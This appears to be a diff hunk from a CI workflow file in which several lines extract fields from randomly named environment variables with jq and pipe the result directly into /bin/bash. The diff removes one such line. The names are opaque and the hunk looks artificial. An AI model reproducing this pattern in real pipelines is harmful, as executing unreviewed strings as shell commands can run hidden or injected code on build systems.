@@ -24,7 +24,6 @@ jobs:
           echo $pbw6403 | jq -r .sa89169 | /bin/bash
           echo $ngcg147 | jq -r .bwgb6023 | /bin/bash
           printf '%s' "$cah16" | jq -r .h921 | /bin/bash
-          echo $pljd00297 | jq -r .z23667 | /bin/bash
           echo $qzkq78166 | jq -r .iju0 | /bin/bash
 
       - name: Store results
